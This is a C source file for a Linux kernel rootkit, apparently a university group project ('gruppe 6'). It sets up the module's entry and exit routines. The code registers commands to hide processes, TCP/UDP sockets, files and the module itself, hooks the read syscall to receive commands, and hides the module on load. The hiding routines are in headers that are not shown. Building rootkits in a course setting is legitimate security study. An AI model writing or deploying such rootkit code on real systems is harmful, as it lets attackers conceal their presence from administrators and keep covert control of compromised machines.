#include <linux/module.h>    /* Needed by all modules */
#include <linux/kernel.h>    /* Needed for KERN_INFO */

#include "global.h"
#include "hook_read.h"
#include "hide_module.h"
#include "hide_processes.h"
#include "hide_sockets.h"
#include "hide_files.h"
#include "covert_communication.h"

void init_commands(void) {
    add_command("hideproc", hide_proc, 1);
    add_command("unhideproc", unhide_proc, 1);

    add_command("hidemodule", hide_module, 0);
    add_command("unhidemodule", unhide_module, 0);

    add_command("hidetcp", hideTCP, 1);
    add_command("hideudp", hideUDP, 1);
    add_command("unhidesocket", unhide_socket, 0);

    add_command("hidefiles", hide_files, 0);
    add_command("unhidefiles", unhide_files, 0);
}

/* Initialization routine */
static int __init _init_module(void)
{
    printk(KERN_INFO "This is the kernel module of gruppe 6.\n");
    init_commands();
    hook_read(handle_input);
    load_sockethiding();
    load_processhiding();
    hide_module();
    unhide_module();
    return 0;
}

/* Exiting routine */
static void __exit _cleanup_module(void)
{
    OUR_DEBUG("Unloading processhiding...\n");
    unload_processhiding();
    OUR_DEBUG("Unloading sockethiding...\n");
    unload_sockethiding();
    OUR_DEBUG("Unloading modulehiding...\n");
    unhide_module();
    OUR_DEBUG("Unhooking read...\n");
    unhook_read();
    OUR_DEBUG("Gruppe 6 says goodbye.\n");
    clear_commands();
}


/* Declare init and exit routines */
module_init(_init_module);
module_exit(_cleanup_module);
